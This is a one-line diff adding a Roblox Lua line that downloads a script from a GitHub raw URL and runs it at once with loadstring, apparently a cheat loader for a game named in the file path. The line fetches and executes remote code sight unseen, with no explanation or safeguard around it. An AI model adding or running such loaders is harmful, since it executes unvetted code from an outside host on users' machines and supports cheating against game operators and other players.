@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/run-a-sari-sari-store-spam2-u3cdij9cl6t89h.lua"))()
